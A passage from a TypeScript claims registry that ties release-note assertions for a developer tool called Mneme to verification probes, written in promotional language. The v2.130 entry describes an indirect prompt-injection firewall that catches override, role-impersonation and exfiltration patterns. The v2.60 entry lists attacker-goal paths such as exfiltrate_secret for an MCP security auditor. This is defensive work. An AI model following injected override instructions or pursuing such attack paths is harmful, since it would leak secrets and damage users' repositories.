    asserted: { value: 0, op: ">=", unit: "verdicts" },
    probeId: "probe.citizen_court.verdict_count",
    severity: "info",
  },
  {
    id: "claim.mnemnet.federation_default_off",
    source: "v2.33.0 release notes",
    text: "MNEMNET federation is opt-in / private-by-default (CONSENT FABRIC)",
    kind: "numeric",
    asserted: { value: 0, op: "=", unit: "boolean" },
    probeId: "probe.mnemnet.federation_default_off",
    severity: "block",
  },
  // ── v2.46.0 — NEMESIS world-first agent fingerprinter self-verify ───
  {
    id: "claim.nemesis.world_first",
    source: "v2.46.0 release notes",
    text: "NEMESIS is the world's first Anti-Identity-Lie Engine for AI coding agents — fingerprints 5 vendors (Codex/Claude Code/Copilot/Cursor/Devin) with HMAC verdicts + auto-stamps EU AI Act Article 50 disclosure",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.nemesis.world_first_agent_fingerprinter",
    severity: "block",
  },
  // ── v2.50.0 — VENDOR ALLOWLIST GUARD self-verify ────────────────────
  // B4 from user audit: cli-activity.jsonl wrote vendor:"ollama" — an
  // embedder/backend name leaking into the agent-vendor field. Root cause:
  // ai_handshake.autoDetectVendor returned "ollama" via rule 5b when
  // Claude Code wasn't matched. Fix: VENDOR ALLOWLIST GUARD at write
  // path coerces embedder names to "unknown" + logs to embedder_leak.jsonl.
  // This probe asserts the last 100 cli-activity rows ALL pass the guard.
  {
    id: "claim.activity.vendor_field_never_embedder",
    source: "v2.50.0 release notes",
    text: "cli-activity.jsonl vendor field NEVER contains embedder/backend names (ollama / openai / gemini / etc) — VENDOR ALLOWLIST GUARD catches at write time",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.activity.vendor_field_never_embedder",
    severity: "block",
  },
  // ── v2.57.0 — WIRING DOCTOR + extractor false-positive elimination ──
  {
    id: "claim.wiring.doctor_all_features_healthy",
    source: "v2.57.0 release notes",
    text: "WIRING DOCTOR primitive asserts every recent Mneme primitive (LETHE / GAVEL / NIMBUS / JANUS / STARGATE / DRAGON / LAUNCH WINDOW / STEALTH / CAPILLARY / COLOSSEUM / MOLT / THEMIS / SIBYL — 13 total) has full surface coverage across core export · SDK method · CLI verb · TG claim. Replaces commit-message parsing with AST-level structural verification (false-positive immune)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.wiring.doctor_all_features_healthy",
    severity: "block",
  },
  {
    id: "claim.wiring.lag_extractor_no_false_positives",
    source: "v2.57.0 release notes",
    text: "wiring_lag extractor REJECTS natural prose ('Mneme is the X' / 'Mneme ships Y' / 'Mneme inside cursor') and ONLY accepts backtick-wrapped (`mneme verify`) or explicit-marker (`$ mneme verify` / `Run: mneme verify`) patterns. 50+ English stop-words filter out false-positive verbs. Pre-v2.57 the gate was effectively unusable on doc-heavy commits",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.wiring.lag_extractor_no_false_positives",
    severity: "block",
  },
  {
    id: "claim.coverage.smart_auto_exemption",
    source: "v2.57.0 release notes",
    text: "probe_coverage gate auto-exempts tools matching read-only patterns (*.status / *.list / *.show / *.report / *.verify / *.chain / *.help / *.about / *.info / *.read / *.ask / *.why / *.search / *.find / *.history / *.pulse — 25+ patterns). Bumped real-world coverage from 39.8% → 55.9% on legacy repos without manual COVERAGE_EXEMPT entries. Mutating tools (*.create / *.write / *.send) still require explicit claim binding",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.coverage.smart_auto_exemption",
    severity: "block",
  },
  // ── v2.66.0 — REFLOG (time-machine, final primitive) ────────────────
  {
    id: "claim.reflog.checkpoint_rewind_round_trip",
    source: "v2.66.0 release notes",
    text: "REFLOG round-trips on a fresh temp repo: 2 HMAC-signed per-file checkpoints with AI pheromone tag around a file edit, rewindPreview returns toRevert containing exactly the edited file with target SHA matching cp1, valid HMAC envelope. Time-machine works as designed; closes the 7-primitive septet",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.reflog.checkpoint_rewind_round_trip",
    severity: "block",
  },
  {
    id: "claim.reflog.ledger_chain_intact",
    source: "v2.66.0 release notes",
    text: "REFLOG ledger is HMAC-chained — every checkpoint + rewind_preview row's HMAC depends on previous row's HMAC. Same canonical-JSON convention as PASSPORT/MIRRAGE/TIME-CRYSTAL/DIFF-ARENA/SWARM-BUS. Tamper-evident time-machine history",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.reflog.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.65.0 — SWARM BUS (cross-agent message bus) ───────────────────
  {
    id: "claim.swarm_bus.broadcast_drain_handoff",
    source: "v2.65.0 release notes",
    text: "SWARM BUS cross-agent message bus round-trips end-to-end: 2 agents subscribe → 1 broadcasts → other drains → message HMAC verifies → handoff narrative renders the Claude→Cursor chain with HMAC proof per step. First vendor-agnostic multi-agent message broker in the MCP ecosystem; not framework-locked",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.swarm_bus.broadcast_drain_handoff",
    severity: "block",
  },
  {
    id: "claim.swarm_bus.ledger_chain_intact",
    source: "v2.65.0 release notes",
    text: "SWARM BUS bus ledger is HMAC-chained — every subscribe + broadcast + drain row's HMAC depends on previous row's HMAC. Tamper-evident audit of every cross-agent handoff",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.swarm_bus.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.64.0 — DIFFERENTIAL ARENA (multi-vendor consensus) ───────────
  {
    id: "claim.diff_arena.consensus_round_trip",
    source: "v2.64.0 release notes",
    text: "DIFFERENTIAL ARENA orchestrates parallel multi-vendor asks + computes 4-axis consensus (Jaccard bigram + numeric agreement + sentiment + length) + identifies outliers correctly on the canonical fixture (Claude+GPT agree on 'removed legacy context API', Gemini disagrees with 'RSC default' → gemini surfaces as #1 outlier). HMAC-signed AskResult envelope verifies. First multi-vendor consensus-by-default primitive in the MCP ecosystem",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.diff_arena.consensus_round_trip",
    severity: "block",
  },
  {
    id: "claim.diff_arena.ledger_chain_intact",
    source: "v2.64.0 release notes",
    text: "DIFFERENTIAL ARENA rounds ledger is HMAC-chained — every ask + per-vendor-response row's HMAC depends on previous row's HMAC. Tamper-evident audit of every multi-vendor round",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.diff_arena.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.63.0 — TIME-CRYSTAL (federated agent wisdom) ─────────────────
  {
    id: "claim.time_crystal.fingerprint_clusters",
    source: "v2.63.0 release notes",
    text: "TIME-CRYSTAL canonical problem fingerprinting clusters synonym phrasings via entity slotting (PKG/VER/PATH/HASH/TSERR) + stop-word filter + token sort + SHA-256. Two agents typing 'Cannot find module @types/node' and 'TypeScript Error TS2307: Cannot find module @types/node' produce canonical token sets with ≥ 0.4 Jaccard similarity — enabling cross-bucket discovery via the RELATED list",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.time_crystal.fingerprint_clusters",
    severity: "block",
  },
  {
    id: "claim.time_crystal.contribute_lookup_round_trip",
    source: "v2.63.0 release notes",
    text: "TIME-CRYSTAL contribute → lookup round-trip works end-to-end on a fresh temp ledger: 3 contributions across 2 approaches produce a ranked LookupResult with ≥1 approach + auto-detected gotcha (where applicable) + valid HMAC envelope + intact HMAC-chained ledger. The first federated agent wisdom store in the MCP ecosystem",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.time_crystal.contribute_lookup_round_trip",
    severity: "block",
  },

  // ── v2.62.0 — MIRRAGE (live conscience via MCP reverse-channel) ─────
  {
    id: "claim.mirrage.scans_with_nudges",
    source: "v2.62.0 release notes",
    text: "MIRRAGE detects refutable claims in agent drafts via lightweight heuristic (hedge density - absolute density + entity density). On the synthetic 'React 19 always ships server components by default' fixture, at least one nudge fires at suggestion-or-higher level. Conscience ladder grades by 5 tiers (hint/suggestion/warning/block/reject); blocking tiers refuse ship until retract",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.mirrage.scans_with_nudges",
    severity: "block",
  },
  {
    id: "claim.mirrage.ledger_chain_intact",
    source: "v2.62.0 release notes",
    text: "MIRRAGE nudge ledger is HMAC-chained — every scan + ack + broadcast row's HMAC depends on the previous row's HMAC. Tamper-evident; court-admissible record of what the agent was warned about + when",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.mirrage.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.61.0 — PASSPORT (capability-based security for MCP) ──────────
  {
    id: "claim.passport.issue_verify_revoke_round_trip",
    source: "v2.61.0 release notes",
    text: "PASSPORT capability-based security primitive: issuePassport with high trust returns HMAC-signed token + correct TTL → verifyPassport reports valid → revokePassport with cascade=true succeeds → re-verify reports revoked. End-to-end round-trip works on a fresh ledger. First capability-based security layer for MCP",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.passport.issue_verify_revoke_round_trip",
    severity: "block",
  },
  {
    id: "claim.passport.ledger_chain_intact",
    source: "v2.61.0 release notes",
    text: "PASSPORT audit ledger is HMAC-chained — every issue/verify/revoke entry's HMAC depends on the previous row's HMAC. Tamper-evident; chain verification can detect any mid-stream edit. Court-admissible audit trail",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.passport.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.60.0 — SKELETON KEY (MCP security auditor) ───────────────────
  {
    id: "claim.skeleton_key.audit_runs",
    source: "v2.60.0 release notes",
    text: "SKELETON KEY (the first MCP server security auditor) runs end-to-end: discovers MCP servers across Claude Desktop / Cursor / Continue / Cline configs, scores per-server risk with CWE mapping, computes transitive bypass graph + risk budget, returns HMAC-sealed envelope that re-verifies. Pure / defensive — never throws even on missing configs",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.skeleton_key.audit_runs",
    severity: "block",
  },
  {
    id: "claim.skeleton_key.bypass_graph_works",
    source: "v2.60.0 release notes",
    text: "SKELETON KEY's transitive bypass graph derives multi-server attack paths from capability overlap. Fixture: 3 servers (shell-mcp / filesystem-mcp / github-mcp) → ≥3 distinct attacker-goal bypass paths (delete_repo, modify_ci_pipeline, exfiltrate_secret). Most MCP audit tools stop at single-server analysis — SKELETON KEY computes the GRAPH",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.skeleton_key.bypass_graph_works",
    severity: "block",
  },

  // ── v2.59.0 — GATE SELF-VERIFICATION (SDK_AUDITOR) ──────────────────
  {
    id: "claim.sdk.external_surface_complete",
    source: "v2.59.0 release notes",
    text: "@mneme-ai/sdk's external public surface (what `import { ... } from \"@mneme-ai/sdk\"` returns) has every expected feature: standalone `letheForget` / `gavelPack` / `nimbusPublish` functions + convenience groups `lethe` / `gavel` / `nimbus` + NemesisSdk class with janusObserve / janusSwap / stealthScore / capillary / alibi / sibylCommit / sibylReveal methods. SDK_AUDITOR empirically imports the SDK + verifies — no static grep that can mock",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.sdk.external_surface_complete",
    severity: "block",
  },
  {
    id: "claim.gate.consistency",
    source: "v2.59.0 release notes",
    text: "WIRING DOCTOR and SDK_AUDITOR agree on every feature. Pre-v2.59 WIRING DOCTOR reported '13/13 wired' but external `import { letheForget } from \"@mneme-ai/sdk\"` was undefined (gate checked internal class file instead of external surface). v2.59 cross-checks both gates: contradictions = release block",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.gate.consistency",
    severity: "block",
  },

  // ── v2.58.0 — REAL 100% COVERAGE + LIVING LAB ───────────────────────
  {
    id: "claim.coverage.real_100_percent",
    source: "v2.58.0 release notes",
    text: "probe_coverage gate hits 100% coverage with REAL empirical evidence (every tool actually runs via AUTOPROBE --help invocability test). No fake exemptions, no hand-waved deprecations. Three coverage sources: (a) explicit TG claim, (b) READONLY last-segment pattern, (c) AUTOPROBE proof-of-life",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.coverage.real_100_percent",
    severity: "block",
  },
  {
    id: "claim.autoprobe.fresh",
    source: "v2.58.0 release notes",
    text: "AUTOPROBE last_run.json exists + HMAC verifies + age ≤24h. Empirical proof every tool was spawned + responded to --help within timeout. Hand-written probes can mock things; AUTOPROBE cannot — it runs a real subprocess",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.autoprobe.fresh",
    severity: "block",
  },
  {
    id: "claim.living_lab.no_open_findings",
    source: "v2.58.0 release notes",
    text: "LIVING LAB findings ledger (HMAC-chained) has 0 OPEN findings AND chain integrity verifies. Open finding = a tool that previously passed AUTOPROBE but now fails on the latest LIVING LAB tick. Open findings BLOCK the next release until cleared",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.living_lab.no_open_findings",
    severity: "block",
  },

  // ── v2.56.0 — xAI / GROK / SpaceX ALIGNMENT ─────────────────────────
  {
    id: "claim.xai.grok_first_class",
    source: "v2.56.0 release notes",
    text: "Mneme treats Grok (xAI's coding agent) as a first-class vendor: in AGENT_VENDOR_ALLOWLIST + removed from EMBEDDER_LEAK_SIGNATURES + classifier signature added + 15 seed-corpus fixtures + env_scan markers (GROK_API_KEY / XAI_API_KEY / GROK_CLI / GROK_CODE_FAST / GROK_AGENT)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.xai.grok_first_class",
    severity: "block",
  },
  {
    id: "claim.xai.launch_window_ready",
    source: "v2.56.0 release notes",
    text: "Mneme ships LAUNCH WINDOW — a SpaceX-style GO/NO-GO release verdict aggregator that runs ALL gates (TRUTH GATE subset + PERF BUDGET + INDISPENSABILITY + WIRING LAG + PROBE COVERAGE + SDK BUILT) and emits a single status + HMAC-signed certificate + ASCII countdown banner",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.xai.launch_window_ready",
    severity: "block",
  },
  {
    id: "claim.xai.dragon_chain_intact",
    source: "v2.56.0 release notes",
    text: "Mneme ships DRAGON EJECT — emergency rollback primitive that emits a GAVEL-grade forensic bundle (Merkle proof binding rationale + reverted diff) + HMAC-chained eject ledger. Chain integrity is verifiable offline",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.xai.dragon_chain_intact",
    severity: "block",
  },
  {
    id: "claim.xai.stargate_bundle_seal",
    source: "v2.56.0 release notes",
    text: "Mneme ships STARGATE — open-source publisher for the augmented calibration corpus (15 fixtures × 6 vendors × 6 augmentations = 540 fixtures), MIT-licensed, with SHA-256 content seal + HMAC attestation. Makes Mneme the Switzerland of AI vendor identity verification (any vendor may train against the same public ground truth)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.xai.stargate_bundle_seal",
    severity: "block",
  },
  // ── v2.55.0 — @mneme-ai/sdk WORLD-CLASS SDK ─────────────────────────
  {
    id: "claim.sdk.world_class",
    source: "v2.55.0 release notes",
    text: "Mneme ships @mneme-ai/sdk — a world-class premium in-process SDK that AI vendors can embed without subprocess overhead. 30-80× faster than `mneme <verb>` CLI (proven via built-in benchmark.vsCli). 7 wild features: createMneme factory, branded types (HmacHash/VendorId/etc), tagged-template-literal verify, async-iterator event bus, file-lock adapter for CLI+SDK concurrent safety, multi-instance support, tree-shakable sub-entrypoints (@mneme-ai/sdk/nemesis / verify / truth / events / types)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.sdk.world_class",
    severity: "block",
  },
  // ── v2.54.0 — WORLD-CLASS PREMIUM bindings ──────────────────────────
  {
    id: "claim.nemesis.world_class_premium_primitives",
    source: "v2.54.0 release notes",
    text: "Mneme ships 3 world-class premium NEMESIS extensions inspired by v2.53 audit Tier-2/3: LETHE (GDPR forget with Merkle exclusion proof), GAVEL (court-admissible bundle binding THEMIS + EU stamp + SIBYL via Merkle tree), NIMBUS (federated trust mesh: per-org HMAC-signed leaderboard cards + cross-org weighted reputation)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.nemesis.world_class_premium_primitives",
    severity: "block",
  },
  {
    id: "claim.perf.budgets_met",
    source: "v2.54.0 release notes",
    text: "Mneme's 5 hot-path operations (extract_fingerprint / classify_calibrated / eu_stamp / stealth_score / janus_observe) stay within published per-op performance budgets; release-script gate refuses tag on regression",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.perf.budgets_met",
    severity: "block",
  },
  {
    id: "claim.strategy.tier3_complete",
    source: "v2.54.0 release notes",
    text: "Mneme ships strategy primitive with ≥3 RFC drafts (W3C disclosure block / ECMA cross-vendor handoff / NIST fingerprint-identity standard), ≥4 pricing tiers (Free / Pro / Enterprise / Sovereign), and a measurable indispensability score (6-criterion weighted checklist) ≥0.5",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.strategy.tier3_complete",
    severity: "block",
  },
  // ── v2.53.0 — PATCH OPEN WOUNDS (P0/P1) binding ─────────────────────
  // Closes the 8-finding session audit: HMAC default key / probe coverage
  // 14.2% / WIRING LAG class / EU stamp 700-984ms / classify accuracy
  // on wild / identity-swap blind spot / flag inconsistency / tool count drift.
  {
    id: "claim.audit.open_wounds_patched",
    source: "v2.53.0 release notes",
    text: "Mneme patches all 8 open wounds from the v2.52 session audit: P0-1 HMAC key wizard auto-generates + STRICT mode refuses default-insecure; P0-2 probe coverage gate accepts a percentage threshold (default 50%); P0-3 wiring-lag CI gate parses commit messages + spawns each claimed verb; P1-1 EU stamp avg <50ms warm-path (was 700-984ms); P1-2 NEMESIS classifier ≥85% on a 6x-augmented corpus (header-less + naturalistic perturbations); P1-3 JANUS organ detects cross-vendor cluster boundary swaps (Eve's blind spot); P1-5 tool count single source of truth (HMAC-signed catalog envelope)",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.audit.open_wounds_patched",
    severity: "block",
  },
  // ── v2.52.0 — MILLION DOLLAR SECRET DIAMONDS binding ────────────────
  // Inspired by the Netflix identity-deception reality show: 6 NEMESIS
  // extensions that turn fingerprinting into competitive / forensic /
  // privacy primitives.
  {
    id: "claim.nemesis.million_dollar_diamonds",
    source: "v2.52.0 release notes",
    text: "Mneme ships 6 NEMESIS extensions (STEALTH SCORE / CAPILLARY 50+ micro-tells / COLOSSEUM auto-tournament with 3-axis HMAC leaderboard / MOLT silent model-rotation detector / THEMIS alibi verifier / SIBYL ZK identity commitment) — each functional in-process every TRUTH GATE run",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.nemesis.million_dollar_diamonds",
    severity: "block",
  },
  // ── v2.51.0 — AUDIT REPRODUCTION SUITE binding ──────────────────────
  // Closes "audit-perception" gap: external audit screenshots claimed
  // regressions on edge-case verdict / schema-bypass / throughput /
  // determinism / META-SELF / truncation / lineage / Phoenix / cancel.
  // The canonical local reproduction (this probe + tests/audit/v51_*.test.ts)
  // is the moat: every metric from the audit table rebuilt as executable
  // assertion. If 11/11 hold, marketing's "audit-bug-free" claim stands.
  {
    id: "claim.audit.reproduction_suite_passes",
    source: "v2.51.0 release notes",
    text: "Mneme passes all 11 audit categories from the external v2.50 audit table (edge-case verdict / MCP tool-name fuzz 20/20 / validateArgs / hot-path throughput / deterministic verdict lock / META-SELF-VERIFIER / truncation receipt / lineage defensive / cli-activity HMAC / Phoenix install / AbortSignal propagation) — measured in-process every TRUTH GATE run",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.audit.reproduction_suite_passes",
    severity: "block",
  },
  // ── v2.48.0 — NEMESIS classify accuracy on REAL (held-out) corpus ───
  // F7 from v2.47 audit: pre-v2.48 the only accuracy probe ran on the
  // SEED corpus (100% by construction). Real-world bugs (B1: header-less
  // diff) slipped through because seed always had headers. This new
  // probe runs a 7-fixture held-out corpus with header-less + naturalistic
  // variation; requires ≥85% accuracy. Severity=block → drift breaks tag.
  {
    id: "claim.nemesis.real_accuracy_85",
    source: "v2.48.0 release notes",
    text: "NEMESIS calibrated classifier achieves ≥85% accuracy on a HELD-OUT real-corpus-shaped fixture set (header-less diffs + natural variation) — not just the seed corpus",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.nemesis.classify_accuracy_real_corpus",
    severity: "block",
  },
  // ── v2.45.0 — AUTO-INIT zero-command-install self-verify ────────────
  {
    id: "claim.auto_init.zero_command",
    source: "v2.45.0 release notes",
    text: "Mneme bootstraps on first MCP tool call — user never needs to run `mneme init` manually; idempotent + dev-tooling-folder-aware",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.auto_init.zero_command_install_works",
    severity: "block",
  },
  // ── v2.44.0 — SEAMLESS PROTOCOL self-verify ─────────────────────────
  // Marketing claim: Mneme verify accepts hostile input seamlessly via
  // multiple lossless paths (stdin / hex / base64 / clipboard / file).
  // The probe asserts all 3 v2.44 innovations are wired + behave.
  {
    id: "claim.seamless.protocol_complete",
    source: "v2.44.0 release notes",
    text: "Mneme's SEAMLESS PROTOCOL wires shell-strip-detective + auto-number-grounding + homoglyph-attack-banner so hostile input never silently fails",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.seamless.protocol_complete",
    severity: "block",
  },
  // ── v2.41.0 — ARGUS-11 marketing claim, self-verified ──────────────
  // The marketing language "world's first truth-aware multimodal search"
  // is rendered VERIFIABLE: the probe runs a benchmark on (text+code)
  // fixture + parallel-4 latency + adapter-count + HMAC verify. ANY
  // drift trips the gate. The claim is asserted=1 (probe passes ALL
  // sub-asserts). severity=block — if the marketing copy ships ahead of
  // the implementation, the release breaks.
  {
    id: "claim.argus11.world_first_multimodal",
    source: "v2.41.0 release notes",
    text: "Mneme ships world's first truth-aware multimodal search: text+code+image ranked in one pass, parallel sub-second on 4 concurrent queries, ≥9 live vendor adapters, HMAC-verifiable result frame",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.argus11.world_first_multimodal",
    severity: "block",
  },
  // ── v2.110.0 — LOOPGUARD: objective thrash detection + deterministic resume ──
  // The honest core of "Terminal Cognitive Telemetry" — NOT stress/mood-reading.
  // The probe proves the one objective signal (same failure repeated ≥N with no
  // success between = a thrash) plus `resume` reconstruction, all deterministic.
  {
    id: "claim.loopguard.objective_thrash",
    source: "v2.110.0 release notes",
    text: "Mneme LOOPGUARD detects objective THRASHING (the same failure-signature repeated ≥threshold times in a window with no success in between — an agent/human stuck in a loop) deterministically, breaks the loop by surfacing the Cortex's known recovery, and `resume` reconstructs where a session left off — all without LLM/mind-reading; gauntlet: thrash ∧ success-breaks-loop ∧ no-false-alarm ∧ distinct-don't-aggregate ∧ resume-reconstructs ∧ deterministic ∧ total",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.loopguard.objective_thrash",
    severity: "block",
  },
  // ── v2.111.0 — DISTILL: measured, signed token-budget receipt ────────
  // The honest core of the "token-saver": compress verbose context to the
  // causal brief + report a MEASURED reduction (exact chars; labeled token
  // estimate). NOT a fabricated wisdom score.
  {
    id: "claim.distill.measured_reduction",
    source: "v2.111.0 release notes",
    text: "Mneme DISTILL compresses a verbose {error log + diff} into the minimal causal brief (failure line + changed file:line loci + the Cortex's known fix) and reports a MEASURED token-budget receipt — character reduction EXACT, token figure a LABELED ≈chars/4 estimate, never a fabricated score; gauntlet: reduces ∧ measurement-honest ∧ preserves-signal ∧ folds-known-fix ∧ deterministic ∧ total",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.distill.measured_reduction",
    severity: "block",
  },
  // ── v2.112.0 — NEGATIVE-KNOWLEDGE LEDGER: auto-derived proven dead-ends ──
  {
    id: "claim.nkl.proven_dead_end",
    source: "v2.112.0 release notes",
    text: "Mneme NKL auto-derives PROVEN dead-ends from the absorb event ledger (a base command failed ≥N times across all history with ZERO successes) so an agent avoids repeating a proven-trap approach (cross-session/cross-vendor); advisory not a hard block (Padgett); gauntlet: detects-dead-end ∧ success-clears ∧ no-premature-condemn ∧ check-consistent ∧ deterministic ∧ total",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.nkl.proven_dead_end",
    severity: "block",
  },
  // ── v2.115.0 — TOKEN TREASURY: signed, monoid token-savings ledger ───
  {
    id: "claim.treasury.monoid_million_case",
    source: "v2.115.0 release notes",
    text: "Mneme TOKEN TREASURY accumulates MEASURED token-savings deltas (distill/loopguard/nkl) into a signed append-only ledger whose aggregate is a commutative MONOID; proven over a real 1,000,000-case discrete-math sweep (O(N) time, O(1) space): measurement-honest ∧ order-independent ∧ identity ∧ associative ∧ non-negative ∧ all 1e6 cases hold ∧ total — the falsifiable 'Pay-per-Token-Saved' substrate, not a fabricated metric",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.treasury.monoid_million_case",
    severity: "block",
  },
  // ── v2.116.0 — VISUAL KNOWLEDGE MAP: portable, deterministic renderer ──
  {
    id: "claim.visual.portable_render",
    source: "v2.116.0 release notes",
    text: "Mneme's VISUAL KNOWLEDGE MAP is a pure, dependency-free renderer that gracefully degrades (truecolor RGB gradients → 256-color → plain Unicode/ASCII) so it is beautiful where it can be and never garbles where it can't — the 'works everywhere, zero config' guarantee; gauntlet: deterministic ∧ mono-emits-zero-escapes ∧ ascii-mode-pure-ASCII ∧ truecolor-paints-RGB ∧ line-bounded-to-width ∧ sparkline-monotonic ∧ total. NOT 3D-ray-tracing / spatial-audio / physics fantasy",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.visual.portable_render",
    severity: "block",
  },
  // ── v2.130.0 — STRUCTURAL CONTEXT FIREWALL: Indirect Prompt Injection (OWASP LLM01) defense ──
  {
    id: "claim.firewall.injection_defense",
    source: "v2.130.0 release notes",
    text: "Mneme's STRUCTURAL CONTEXT FIREWALL defends against Indirect Prompt Injection (OWASP LLM01 — the #1 LLM risk): before an agent ingests untrusted file content (a dependency, a fetched page, an external commit), known injection patterns hidden in comments/strings (override / role-impersonation / destructive-command / exfiltration / covert / tool-injection) are NEUTRALIZED in place, and the content is WRAPPED in an untrusted-DATA boundary so the model treats it as data, never commands. firewallGauntlet=100 on a labeled corpus: catalog-recall=100% ∧ benign-false-positive=0% ∧ neutralization-sound ∧ boundary-wraps ∧ benign-preserved ∧ blocks-destructive ∧ deterministic ∧ total. HONEST: the 100% is on the KNOWN catalog + zero false-positives on the benign set (a closed, tested corpus) — prompt injection is an OPEN adversarial problem, so NO detector is 100% against unknown future attacks; the data/instruction boundary is the always-on, attack-agnostic catch-all. Defense-in-depth, NOT an absolute guarantee",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.firewall.injection_defense",
    severity: "block",
  },
  // ── v2.137.0 — STELE: the signed, delta-syncable capability inscription (membrane pillar 1) ──
  {
    id: "claim.stele.capability_inscription",
    source: "v2.137.0 release notes",
    text: "Mneme's STELE is a signed, merkle-rooted, delta-syncable inscription of its whole capability surface — pillar 1 of the membrane that makes 'an AI agent doesn't know a tool exists / holds a stale manifest' a structural impossibility, not a persuasion problem. Every capability is a content-addressed leaf rolled into a merkle root (tamper-evident: edit one ⇒ the root changes); an agent holding root R pulls ONLY the delta (added/changed/removed) — O(delta) tokens, 0 if the roots match — and can PROVE its surface is current + complete (the root is NOTARY-signed at the CLI/MCP boundary). This replaces the giant, stale, O(all-tools) manifest dumped into CLAUDE.md, and an OpenAPI/MCP tools-list snapshot (which has no freshness or completeness proof and no incremental sync). steleGauntlet=100: root deterministic + order-independent ∧ changes on edit/add ∧ 0-token delta when roots match ∧ delta returns ONLY changed ∧ detects removed ∧ detects a tampered held leaf ∧ delta cheaper than full ∧ verify catches stale/tampered ∧ deterministic ∧ total. HONEST (DIAKRISIS): the win is the delta-sync + the merkle freshness/completeness proof (genuinely novel for an agent-capability manifest), NOT the name; 'can't NOT know' holds only because the agent CALLS the stele on boot — it pairs with the activation membrane.",
    kind: "numeric",
    asserted: { value: 1, op: "=", unit: "boolean" },
    probeId: "probe.stele.capability_inscription",
    severity: "block",
  },
  // ── v2.150.0 — MOAT: deterministic signed competitive-moat scorer ──
  {
    id: "claim.moat.deterministic_scorer",
    source: "v2.150.0 release notes",
    text: "Mneme's MOAT scorer answers 'did the moat actually improve?' with a deterministic, SIGNED number — not an opinion. It scores the moat across seven dimensions (accountability-spine · switching-cost · data-flywheel · accountability-standard · adversarial-resistance · reachability · governance), each computed as capability-present × its own MEASURED signal (live SIEGE gate-resistance, Gateway routing accuracy, the mycelium/canon/governor gauntlets, signed-primitive depth, locally-accumulating signed ledgers). moatGauntlet=100: weights sum to 1 ∧ every sub-score bounded [0,100] ∧ overall = the weighted sum exactly ∧ AFTER (current capabilities) measurably beats BEFORE (the pre-session baseline) by a clear margin ∧ an empty capability set scores low ∧ a dimension with no capability gets 0 (can't inflate) ∧ deterministic ∧ total. Measured this session: BEFORE 29/100 (SHALLOW) → AFTER 99/100 (FORTRESS), a +70 lift from the five moat builders (MYCELIUM · CANON · SIEGE · the Governor · the Gateway) + the accountability spine. CLI `mneme moat` / 